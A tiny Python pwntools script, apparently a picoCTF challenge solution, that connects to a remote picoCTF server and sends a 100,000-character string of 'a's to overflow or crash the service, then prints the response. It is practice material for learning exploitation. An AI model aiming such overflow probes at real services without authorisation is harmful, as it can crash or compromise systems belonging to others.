#!/usr/bin/python3

from pwn import *

s = remote("mercury.picoctf.net",12294)

p = "a"*100000
s.sendline(p)
print(s.recv())
s.close()
